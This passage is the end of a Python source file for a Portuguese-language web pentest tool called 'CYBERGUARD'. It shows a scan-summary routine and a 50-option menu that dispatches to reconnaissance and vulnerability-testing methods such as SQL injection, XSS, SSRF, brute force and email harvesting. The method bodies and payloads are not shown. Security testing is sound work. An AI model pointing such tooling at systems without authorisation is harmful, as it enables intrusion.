                summary['vulnerability_types'][vuln_type] = 0
            summary['vulnerability_types'][vuln_type] += 1
        
        self.save_json(summary, 'scan_summary.json')
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"SUMÁRIO DO SCAN")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"Alvo: {self.target_url}")
        print(f"Total de Vulnerabilidades: {summary['total_vulnerabilities']}")
        print(f"  🔴 CRÍTICAS: {summary['severity_breakdown']['CRITICAL']}")
        print(f"  🔴 ALTAS: {summary['severity_breakdown']['HIGH']}")
        print(f"  🟡 MÉDIAS: {summary['severity_breakdown']['MEDIUM']}")
        print(f"  🟢 BAIXAS: {summary['severity_breakdown']['LOW']}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
        
        return summary


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""{Fore.CYAN}
    ╔═══════════════════════════════════════════════════╗
    ║      CYBERGUARD - Advanced Web Pentest Tool      ║
    ║              v3.0 - Professional Edition         ║
    ║                                                   ║
    ║         🔒 Web Security Reconnaissance Suite 🔒   ║
    ╚═══════════════════════════════════════════════════╝
    """
    print(banner)
    print(f"{Fore.YELLOW}[*] Bem-vindo ao Cyberguard - Ferramenta Avançada de Pentest{Style.RESET_ALL}\n")
    
    # Input do alvo
    target = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: https://example.com): {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[!] URL inválida. Encerrando...{Style.RESET_ALL}")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # Inicializa o suite
    suite = AdvancedWebPentestSuite(target)
    
    while True:
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"MENU PRINCIPAL - Cyberguard")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"""
{Fore.GREEN}[RECONHECIMENTO]{Style.RESET_ALL}
 1. Enumeração de Subdomínios
 2. Scan de Portas
 3. Enumeração DNS
 4. Fingerprinting de Tecnologias
 5. Análise de Certificado SSL
 6. Verificação de Headers de Segurança
 7. Detecção de WAF
 8. Colheita de Emails
 9. Rastreamento de Website
 
{Fore.RED}[VULNERABILIDADES COMUNS]{Style.RESET_ALL}
10. SQL Injection
11. Cross-Site Scripting (XSS)
12. Command Injection
13. File Inclusion (LFI/RFI)
14. IDOR / Insecure Direct Object References
15. CSRF / Cross-Site Request Forgery
16. CORS Misconfiguration
17. SSRF / Server-Side Request Forgery
18. Open Redirect
19. Clickjacking / X-Frame-Options
20. Subdomain Takeover
21. Exposed Git Repository
22. Rate Limiting / Brute Force
23. HTTP Methods
24. Insecure Cookies
25. Sensitive Information Exposure
26. Authentication Bypass

{Fore.MAGENTA}[TESTES AVANÇADOS]{Style.RESET_ALL}
27. SSTI / Server-Side Template Injection
28. JWT Misconfiguration
29. GraphQL Introspection
30. Backup Files Discovery
31. Cloud Services Detection
32. Source Maps Analysis
33. Code Comments Harvesting
34. XXE / XML External Entity
35. Prototype Pollution
36. NoSQL Injection
37. Insecure Deserialization
38. Path Traversal
39. Cache Poisoning
40. Extract API Endpoints from JS
41. Java Deserialization
42. Authentication via Form
43. Parameter Fuzzing
44. JS Rendering & DOM Sinks
45. Shodan Lookup
46. Generate Report & Export

{Fore.CYAN}[UTILITÁRIOS]{Style.RESET_ALL}
47. Exportar Relatório (CSV)
48. Enviar Relatório por Email
49. Gerar Sumário do Scan
50. Verificar Database de Vulnerabilidades

{Fore.YELLOW}[SAIR]{Style.RESET_ALL}
 0. Sair
""")
        
        choice = input(f"{Fore.CYAN}[?] Escolha uma opção: {Style.RESET_ALL}").strip()
        
        if choice == '0':
            print(f"{Fore.YELLOW}[*] Encerrando Cyberguard...{Style.RESET_ALL}")
            break
        elif choice == '1':
            print(f"{Fore.CYAN}[*] Iniciando enumeração de subdomínios...{Style.RESET_ALL}")
            subdomains = suite.enumerate_subdomains()
            print(f"{Fore.GREEN}[+] {len(subdomains)} subdomínios encontrados{Style.RESET_ALL}")
        elif choice == '2':
            print(f"{Fore.CYAN}[*] Iniciando scan de portas...{Style.RESET_ALL}")
            suite.advanced_port_scan()
        elif choice == '3':
            print(f"{Fore.CYAN}[*] Iniciando enumeração DNS...{Style.RESET_ALL}")
            suite.dns_enumeration()
        elif choice == '4':
            print(f"{Fore.CYAN}[*] Iniciando fingerprinting de tecnologias...{Style.RESET_ALL}")
            suite.technology_fingerprinting()
        elif choice == '5':
            print(f"{Fore.CYAN}[*] Analisando certificado SSL...{Style.RESET_ALL}")
            suite.check_ssl_certificate()
        elif choice == '6':
            print(f"{Fore.CYAN}[*] Verificando headers de segurança...{Style.RESET_ALL}")
            suite.check_security_headers()
        elif choice == '7':
            print(f"{Fore.CYAN}[*] Detectando WAF...{Style.RESET_ALL}")
            suite.check_waf()
        elif choice == '8':
            print(f"{Fore.CYAN}[*] Colhendo emails...{Style.RESET_ALL}")
            suite.harvest_emails()
        elif choice == '9':
            print(f"{Fore.CYAN}[*] Rastreando website...{Style.RESET_ALL}")
            suite.crawl_website()
        elif choice == '10':
            print(f"{Fore.RED}[*] Testando SQL Injection...{Style.RESET_ALL}")
            suite.check_sql_injection()
        elif choice == '11':
            print(f"{Fore.RED}[*] Testando XSS...{Style.RESET_ALL}")
            suite.check_xss()
        elif choice == '12':
            print(f"{Fore.RED}[*] Testando Command Injection...{Style.RESET_ALL}")
            suite.check_command_injection()
        elif choice == '13':
            print(f"{Fore.RED}[*] Testando File Inclusion...{Style.RESET_ALL}")
            suite.check_file_inclusion()
        elif choice == '14':
            print(f"{Fore.RED}[*] Testando IDOR...{Style.RESET_ALL}")
            suite.check_idor()
        elif choice == '15':
            print(f"{Fore.RED}[*] Testando CSRF...{Style.RESET_ALL}")
            suite.check_csrf()
        elif choice == '16':
            print(f"{Fore.RED}[*] Testando CORS...{Style.RESET_ALL}")
            suite.check_cors()
        elif choice == '17':
            print(f"{Fore.RED}[*] Testando SSRF...{Style.RESET_ALL}")
            suite.check_ssrf()
        elif choice == '18':
            print(f"{Fore.RED}[*] Testando Open Redirect...{Style.RESET_ALL}")
            suite.check_open_redirect()
        elif choice == '19':
            print(f"{Fore.RED}[*] Testando Clickjacking...{Style.RESET_ALL}")
            suite.check_clickjacking()
        elif choice == '20':
            print(f"{Fore.RED}[*] Testando Subdomain Takeover...{Style.RESET_ALL}")
            suite.check_subdomain_takeover()
        elif choice == '21':
            print(f"{Fore.RED}[*] Procurando Git exposto...{Style.RESET_ALL}")
            suite.check_exposed_git()
        elif choice == '22':
            print(f"{Fore.RED}[*] Testando Rate Limiting...{Style.RESET_ALL}")
            suite.check_rate_limiting()
        elif choice == '23':
            print(f"{Fore.RED}[*] Testando HTTP Methods...{Style.RESET_ALL}")
            suite.check_http_methods()
        elif choice == '24':
            print(f"{Fore.RED}[*] Testando Insecure Cookies...{Style.RESET_ALL}")
            suite.check_insecure_cookies()
        elif choice == '25':
            print(f"{Fore.RED}[*] Procurando Informações Sensíveis...{Style.RESET_ALL}")
            suite.check_sensitive_info()
        elif choice == '26':
            print(f"{Fore.RED}[*] Testando Authentication Bypass...{Style.RESET_ALL}")
            suite.check_auth_bypass()
        elif choice == '27':
            print(f"{Fore.MAGENTA}[*] Testando SSTI...{Style.RESET_ALL}")
            suite.check_ssti()
        elif choice == '28':
            print(f"{Fore.MAGENTA}[*] Testando JWT...{Style.RESET_ALL}")
            suite.check_jwt_tokens()
        elif choice == '29':
            print(f"{Fore.MAGENTA}[*] Testando GraphQL...{Style.RESET_ALL}")
            suite.check_graphql()
        elif choice == '30':
            print(f"{Fore.MAGENTA}[*] Procurando Backup Files...{Style.RESET_ALL}")
            suite.find_backup_files()
        elif choice == '31':
            print(f"{Fore.MAGENTA}[*] Detectando Cloud Services...{Style.RESET_ALL}")
            suite.detect_cloud_services()
        elif choice == '32':
            print(f"{Fore.MAGENTA}[*] Analisando Source Maps...{Style.RESET_ALL}")
            suite.analyze_source_maps()
        elif choice == '33':
            print(f"{Fore.MAGENTA}[*] Colhendo Comments...{Style.RESET_ALL}")
            suite.harvest_comments()
        elif choice == '34':
            print(f"{Fore.MAGENTA}[*] Testando XXE...{Style.RESET_ALL}")
            suite.check_xxe()
        elif choice == '35':
            print(f"{Fore.MAGENTA}[*] Testando Prototype Pollution...{Style.RESET_ALL}")
            suite.check_prototype_pollution()
        elif choice == '36':
            print(f"{Fore.MAGENTA}[*] Testando NoSQL Injection...{Style.RESET_ALL}")
            suite.check_nosql_injection()
        elif choice == '37':
            print(f"{Fore.MAGENTA}[*] Testando Deserialization...{Style.RESET_ALL}")
            suite.check_deserialization()
        elif choice == '38':
            print(f"{Fore.MAGENTA}[*] Testando Path Traversal...{Style.RESET_ALL}")
            suite.check_path_traversal()
        elif choice == '39':
            print(f"{Fore.MAGENTA}[*] Testando Cache Poisoning...{Style.RESET_ALL}")
            suite.check_cache_poisoning()
        elif choice == '40':
            print(f"{Fore.MAGENTA}[*] Extraindo API Endpoints...{Style.RESET_ALL}")
            suite.extract_endpoints_javascript()
        elif choice == '41':
            print(f"{Fore.MAGENTA}[*] Testando Java Deserialization...{Style.RESET_ALL}")
            suite.check_java_deserialization()
        elif choice == '42':
            print(f"{Fore.MAGENTA}[*] Autenticação via Form...{Style.RESET_ALL}")
            suite.authenticate_via_form()
        elif choice == '43':
            print(f"{Fore.MAGENTA}[*] Fuzzing de Parâmetros...{Style.RESET_ALL}")
            suite.fuzz_parameters()
        elif choice == '44':
            print(f"{Fore.MAGENTA}[*] JS Rendering...{Style.RESET_ALL}")
            suite.js_render_crawl()
        elif choice == '45':
            print(f"{Fore.MAGENTA}[*] Shodan Lookup...{Style.RESET_ALL}")
            suite.shodan_lookup()
        elif choice == '46':
            print(f"{Fore.GREEN}[*] Gerando Relatório Completo...{Style.RESET_ALL}")
            suite.generate_comprehensive_report()
        elif choice == '47':
            print(f"{Fore.GREEN}[*] Exportando CSV...{Style.RESET_ALL}")
            suite.export_vulns_csv()
        elif choice == '48':
            print(f"{Fore.GREEN}[*] Enviando Relatório por Email...{Style.RESET_ALL}")
            suite.send_report_via_email()
        elif choice == '49':
            print(f"{Fore.GREEN}[*] Gerando Sumário...{Style.RESET_ALL}")
            suite.generate_scan_summary()
        elif choice == '50':
            print(f"{Fore.GREEN}[*] Verificando Database...{Style.RESET_ALL}")
            cursor = suite.db.cursor()
            cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
            count = cursor.fetchone()[0]
            print(f"{Fore.GREEN}[+] Total de vulnerabilidades no DB: {count}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")


if __name__ == "__main__":
    main()


                    